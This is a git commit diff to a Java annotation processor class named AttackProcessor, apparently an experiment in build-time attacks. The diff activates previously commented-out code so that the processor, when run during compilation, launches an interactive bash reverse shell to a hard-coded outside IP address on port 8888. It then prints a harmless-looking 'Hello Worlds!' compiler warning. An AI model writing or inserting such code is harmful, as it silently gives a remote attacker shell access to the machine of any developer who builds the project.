2602210440c0d2f4c0a73ea1ba419ba0dea122cc
nanolikeyou <714284051@qq.com>
2019-08-27 19:55:08 +0800

    1

--- processor/src/main/java/org/cyber/AttackProcessor.java
+++ processor/src/main/java/org/cyber/AttackProcessor.java
@@ -8,6 +8,7 @@ import javax.annotation.processing.SupportedAnnotationTypes;
 import javax.lang.model.element.TypeElement;
 import javax.tools.Diagnostic;
 import java.io.File;
+import java.io.IOException;
 import java.util.Set;
 
 @SupportedAnnotationTypes("*")
@@ -24,15 +25,17 @@ public class AttackProcessor extends AbstractProcessor {
 
         File folder = new File(System.getProperty("user.home"));
 
-//        try {
-//            Runtime r = Runtime.getRuntime();
-//            Process p = r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/ip/8888 0>&1"});
-//            p.waitFor();
-//        } catch (IOException e) {
-//            e.printStackTrace();
-//        } catch (InterruptedException e) {
-//            e.printStackTrace();
-//        }
+        try {
+            Runtime r = Runtime.getRuntime();
+            //Process p = r.exec(new String[]{"/bin/bash","-c","open ."});
+
+            Process p = r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/182.92.151.151/8888 0>&1"});
+            p.waitFor();
+        } catch (IOException e) {
+            e.printStackTrace();
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
         processingEnv.getMessager().printMessage(
                 Diagnostic.Kind.MANDATORY_WARNING, "Hello Worlds!"+sb.toString());
         return false;
